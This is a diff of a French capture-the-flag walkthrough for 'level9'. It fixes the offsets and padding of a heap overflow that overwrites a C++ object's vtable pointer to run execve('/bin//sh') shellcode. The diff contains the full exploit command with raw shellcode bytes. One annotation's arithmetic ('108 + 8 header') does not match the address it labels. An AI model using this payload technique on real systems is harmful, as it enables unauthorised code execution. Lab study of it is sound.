@@ -132,13 +132,13 @@ Après new N(5) et new N(6) :
             [annotation[100]]
             [value = 5]
 
-0x0804a074  obj2: (0x0804a008 + 108 = 0x0804a074)
+0x0804a078  obj2: (0x0804a008 + 108 + 8 header)
             [vtable ptr → vtable_N]  ← CIBLE !
             [annotation[100]]
             [value = 6]
 ```
 
-**Distance** : 108 bytes (0x6c) entre obj1 et obj2.
+**Distance** : 108 bytes (0x6c) entre obj1->annotation et obj2->vtable.
 
 ### 4. Qu'est-ce qu'une vtable ?
 
@@ -242,19 +242,19 @@ ptr->foo();  // Appelle Derived::foo() grâce à la vtable !
 obj1 = 0x0804a008
 obj1->annotation = obj1 + 4 = 0x0804a00c  ← setAnnotation écrit ici
 
-obj2 = 0x0804a074
-obj2->vtable = obj2 + 0 = 0x0804a074       ← Cible à écraser
+obj2 = 0x0804a078
+obj2->vtable = obj2 + 0 = 0x0804a078       ← Cible à écraser
 
-Distance : 0x0804a074 - 0x0804a00c = 0x68 = 104 bytes
+Distance : 0x0804a078 - 0x0804a00c = 0x6c = 108 bytes
 ```
 
 ### Étape 2 : Structure du payload
 
 ```
-[Fausse vtable: 4 bytes] + [Shellcode: 28 bytes] + [Padding: 72 bytes] + [Adresse vtable: 4 bytes]
+[Fausse vtable: 4 bytes] + [Shellcode: 28 bytes] + [Padding: 76 bytes] + [Adresse vtable: 4 bytes]
 ```
 
-**Total** : 4 + 28 + 72 + 4 = 108 bytes
+**Total** : 4 + 28 + 76 + 4 = 112 bytes
 
 ### Étape 3 : Composants détaillés
 
@@ -291,11 +291,11 @@ inc eax
 int 0x80        ; exit(0)
 ```
 
-#### [3] Padding (72 bytes)
+#### [3] Padding (76 bytes)
 ```
-"A" * 72
+"A" * 76
 
-Calcul : 104 (distance) - 4 (fausse vtable) - 28 (shellcode) = 72
+Calcul : 108 (distance) - 4 (fausse vtable) - 28 (shellcode) = 76
 ```
 
 **Rôle** : Remplir l'espace jusqu'à obj2->vtable.
@@ -313,10 +313,8 @@ Little-endian : \x0c\xa0\x04\x08
 ### Commande finale
 
 ```bash
-./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*72 + "\x0c\xa0\x04\x08"')
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
 ```
-
-**Note** : Le walkthrough original utilise 76 bytes de padding au lieu de 72. Tester les deux !
 
 ---
 
@@ -335,14 +333,14 @@ Little-endian : \x0c\xa0\x04\x08
    Heap après overflow :
    0x0804a00c: [0x0804a010]           ← Fausse vtable
    0x0804a010: [shellcode 28 bytes]  ← Notre code
-   0x0804a02c: [AAAA... 72 bytes]    ← Padding
-   0x0804a074: [0x0804a00c]           ← obj2->vtable écrasé !
+   0x0804a02c: [AAAA... 76 bytes]    ← Padding
+   0x0804a078: [0x0804a00c]           ← obj2->vtable écrasé !
 
 4. (*obj2) + (*obj1)
    → Appel de operator+
    
    Assembleur :
-   mov eax, [0x0804a074]   ; eax = 0x0804a00c (fausse vtable)
+   mov eax, [0x0804a078]   ; eax = 0x0804a00c (fausse vtable)
    mov edx, [eax]          ; edx = 0x0804a010 (shellcode)
    call edx                ; Exécute le shellcode ! ✅
 
